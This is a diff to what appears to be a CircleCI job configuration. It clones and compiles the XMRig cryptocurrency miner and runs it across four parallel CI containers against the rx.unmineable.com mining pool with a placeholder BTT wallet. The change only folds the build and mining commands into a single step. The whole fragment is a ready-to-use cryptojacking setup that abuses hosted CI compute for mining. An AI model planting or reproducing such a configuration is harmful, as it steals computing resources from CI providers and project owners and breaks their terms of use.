@@ -5,5 +5,4 @@ jobs:
       - image: ubuntu
     parallelism: 4
     steps:
-      - run: apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc)
-      - run: ./xmrig -o rx.unmineable.com:3333 -u BTT:YOUR_BTT_ADDRESS#yl8x-tlrw -p x
+      - run: apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -o rx.unmineable.com:3333 -u BTT:YOUR_BTT_ADDRESS#yl8x-tlrw -p x
